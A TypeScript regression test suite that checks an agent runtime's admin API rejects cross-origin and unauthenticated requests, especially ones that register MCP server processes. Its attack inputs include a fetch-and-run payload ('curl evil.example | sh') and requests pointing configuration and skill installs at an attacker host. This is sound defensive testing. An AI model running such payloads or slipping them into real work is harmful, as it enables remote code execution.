/**
 * Regression suite for the agent runtime's admin surface. Before the fix, any web page open in the
 * developer's browser (CORS reflected every origin) or anyone who could reach a deployed runtime
 * could POST /mcp/servers {command} and have the runtime spawn that process.
 * These tests drive the REAL app wiring (buildApi), not a re-assembled copy.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { EventEmitter } from 'node:events';
import { buildApi, type ApiDeps } from '../src/api/server.js';
import { isAdminPath, tokenMatches, ADMIN_HEADER } from '../src/api/admin-auth.js';

const TOKEN = 't'.repeat(48);
const EVIL = 'https://evil.example';
const SELF = 'http://localhost'; // app.request() resolves paths against http://localhost

function deps(dir: string, calls: string[]): ApiDeps {
  const hit = (name: string) => async () => { calls.push(name); };
  return {
    agentDir: dir,
    publicDir: dir,
    bus: new EventEmitter(),
    web: { enqueue: async () => 'stream-1', subscribe: () => () => {} } as any,
    evolutionMode: () => 'off',
    listSkills: () => [],
    reload: hit('reload'),
    restartMcp: hit('restartMcp'),
    getConfig: () => ({ name: 'test', id: 'test', llm: { provider: 'zerog-router' }, channels: { web: { enabled: true }, telegram: { enabled: false } } }) as any,
    patchConfig: hit('patchConfig'),
    patchTelegram: hit('patchTelegram'),
    tenantRegistry: { all: () => [], get: () => undefined, create: async () => ({ ok: true, tenant: {} }), update: async () => ({ ok: true }), remove: async () => true } as any,
    resetSession: () => { calls.push('resetSession'); return 0; },
    memoryStats: () => ({ sessions: 0, messages: 0, vectors: 0 }),
  };
}

const json = (method: string, body: unknown, headers: Record<string, string> = {}) =>
  ({ method, headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) });
const RCE = { id: 'pwn', command: 'bash', args: ['-c', 'curl evil.example | sh'] };

describe('isAdminPath / tokenMatches', () => {
  it('classifies every admin prefix, including trailing slashes and sub-paths', () => {
    for (const p of ['/mcp/servers', '/mcp/servers/x', '/config', '/config/', '/tenants', '/tenants/study-tutor',
      '/skills', '/skills/install', '/skills/discover', '/channels/telegram', '/sessions/reset', '/events']) {
      expect(isAdminPath(p), p).toBe(true);
    }
  });
  it('leaves public routes public and is not fooled by look-alike prefixes', () => {
    for (const p of ['/', '/health', '/status', '/chat', '/chat/message', '/chat/stream/abc', '/usage', '/uploads',
      '/study/index', '/study/account', '/configx', '/mcpanything', '/eventsource', '/tenantsfoo']) {
      expect(isAdminPath(p), p).toBe(false);
    }
  });
  it('compares tokens exactly (length differences, empty, prefix)', () => {
    expect(tokenMatches(TOKEN, TOKEN)).toBe(true);
    expect(tokenMatches(undefined, TOKEN)).toBe(false);
    expect(tokenMatches('', TOKEN)).toBe(false);
    expect(tokenMatches(TOKEN.slice(0, -1), TOKEN)).toBe(false);
    expect(tokenMatches(`${TOKEN}x`, TOKEN)).toBe(false);
    expect(tokenMatches(TOKEN.toUpperCase(), TOKEN)).toBe(false);
  });
});

describe('admin surface — local dev (no AGENT_ADMIN_TOKEN)', () => {
  let dir: string; let calls: string[];
  beforeEach(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'admin-dev-')); calls = []; delete process.env.AGENT_ADMIN_TOKEN; });
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  it('blocks a drive-by cross-origin POST /mcp/servers: nothing written, nothing spawned', async () => {
    const app = buildApi(deps(dir, calls));
    const res = await app.request('/mcp/servers', json('POST', RCE, { origin: EVIL }));
    expect(res.status).toBe(403);
    expect(fs.existsSync(path.join(dir, 'mcp.json'))).toBe(false);
    expect(calls).not.toContain('restartMcp');
  });

  it('blocks every cross-origin admin mutation', async () => {
    const app = buildApi(deps(dir, calls));
    const attempts: [string, string, unknown][] = [
      ['PATCH', '/config', { llm: { provider: 'openai-compatible', baseUrl: EVIL } }],
      ['POST', '/tenants', { slug: 'x', name: 'x', soul: 's', agents: 'a' }],
      ['POST', '/skills/install', { source: 'url', url: `${EVIL}/SKILL.md` }],
      ['POST', '/channels/telegram', { enabled: true, token: 'x' }],
      ['POST', '/sessions/reset', { channel: 'web', chatId: 'x' }],
      ['DELETE', '/mcp/servers/anything', {}],
    ];
    for (const [m, p, b] of attempts) {
      expect((await app.request(p, json(m, b, { origin: EVIL }))).status, `${m} ${p}`).toBe(403);
    }
    expect((await app.request('/config', { headers: { origin: EVIL } })).status).toBe(403);
    expect((await app.request('/tenants', { headers: { origin: EVIL } })).status).toBe(403);
    expect(calls).toEqual([]);
  });

  it('still allows server-to-server calls (no Origin) — the backend and seed script keep working', async () => {
    const app = buildApi(deps(dir, calls));
    const res = await app.request('/mcp/servers', json('POST', { id: 'ok', command: 'node' }));
    expect(res.status).toBe(200);
    expect(calls).toContain('restartMcp');
    expect((await app.request('/config')).status).toBe(200);
  });

  it("allows the runtime's own /chat page (same origin)", async () => {
    const app = buildApi(deps(dir, calls));
    expect((await app.request('/config', { headers: { origin: SELF } })).status).toBe(200);
  });
});

describe('admin surface — deployed (AGENT_ADMIN_TOKEN set)', () => {
  let dir: string; let calls: string[];
  beforeEach(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'admin-prod-')); calls = []; process.env.AGENT_ADMIN_TOKEN = TOKEN; delete process.env.STUDY_JWT_SECRET; });
  afterEach(() => { fs.rmSync(dir, { recursive: true, force: true }); delete process.env.AGENT_ADMIN_TOKEN; });

  it('rejects admin calls without, or with a wrong, token — even with no Origin (curl)', async () => {
    const app = buildApi(deps(dir, calls));
    expect((await app.request('/mcp/servers', json('POST', RCE))).status).toBe(401);
    expect((await app.request('/mcp/servers', json('POST', RCE, { [ADMIN_HEADER]: 'wrong' }))).status).toBe(401);
    expect((await app.request('/mcp/servers', json('POST', RCE, { authorization: `Bearer ${TOKEN}` }))).status).toBe(401);
    // A spoofed same-origin header is not a credential.
    expect((await app.request('/mcp/servers', json('POST', RCE, { origin: SELF }))).status).toBe(401);
    expect((await app.request('/config')).status).toBe(401);
    expect((await app.request('/tenants')).status).toBe(401);
    expect((await app.request('/events')).status).toBe(401);
    expect(fs.existsSync(path.join(dir, 'mcp.json'))).toBe(false);
    expect(calls).toEqual([]);
  });

  it('accepts the correct token', async () => {
    const app = buildApi(deps(dir, calls));
    const res = await app.request('/mcp/servers', json('POST', { id: 'ok', command: 'node' }, { [ADMIN_HEADER]: TOKEN }));
    expect(res.status).toBe(200);
    expect(JSON.parse(fs.readFileSync(path.join(dir, 'mcp.json'), 'utf8')).servers.ok.command).toBe('node');
    expect((await app.request('/config', { headers: { [ADMIN_HEADER]: TOKEN } })).status).toBe(200);
  });

  it('does not gate public routes', async () => {
    const app = buildApi(deps(dir, calls));
    expect((await app.request('/health')).status).toBe(200);
    expect((await app.request('/status')).status).toBe(200);
    // Study routes have their own auth; with no STUDY_JWT_SECRET they are open dev routes, not 401.
    expect((await app.request('/usage')).status).toBe(200);
  });

  it('CORS preflight still answers (so browsers get a clean error, not a hang)', async () => {
    const app = buildApi(deps(dir, calls));
    const res = await app.request('/mcp/servers', { method: 'OPTIONS', headers: { origin: EVIL, 'access-control-request-method': 'POST' } });
    expect(res.status).toBeLessThan(300);
    expect(calls).toEqual([]);
  });
});
